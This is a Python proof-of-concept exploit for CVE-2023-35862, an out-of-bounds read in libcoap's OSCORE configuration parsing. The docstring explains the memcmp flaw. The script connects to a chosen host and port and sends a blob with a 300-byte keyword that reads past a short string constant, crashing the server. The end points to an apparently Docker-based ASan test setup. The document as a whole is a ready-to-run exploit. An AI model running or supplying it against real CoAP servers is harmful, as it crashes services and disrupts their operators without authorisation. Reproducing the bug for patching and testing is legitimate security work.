#!/usr/bin/env python3
"""
PoC for CVE-2023-35862 - libcoap OSCORE config buffer over-read (CWE-125).

The vulnerable server parses an OSCORE configuration blob via
coap_new_oscore_conf() -> coap_parse_oscore_conf_mem(). For each config line it
runs:

    memcmp(oscore_config[i].keyword, keyword.s, keyword.length)

where oscore_config[i].keyword is a short NUL-terminated .rodata string and
keyword.length is taken from our input. Sending a keyword far LONGER than the
shortest table keyword makes memcmp read past the end of the global string
constant -> ASan global-buffer-overflow abort.

Usage: poc_cve_2023_35862.py [host] [port]
"""
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 5683

# An over-long keyword (300 bytes) forces memcmp to read 300 bytes from each
# short .rodata table keyword. encoding "ascii" + a value keep get_split_entry
# happy enough to reach the keyword comparison loop. Trailing newline so the
# parser treats it as a complete line.
keyword = b"A" * 300
blob = keyword + b",ascii,xx\n"

print(f"[*] Connecting to {host}:{port}")
s = socket.create_connection((host, port), timeout=5)
print(f"[*] Sending {len(blob)}-byte OSCORE config with {len(keyword)}-byte keyword")
s.sendall(blob)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
try:
    data = s.recv(256)
    print(f"[*] Server response: {data!r}")
except OSError as e:
    print(f"[*] Connection closed/reset (expected on crash): {e}")
s.close()
print("[*] Done. Check `docker logs` for the ASan global-buffer-overflow trace.")
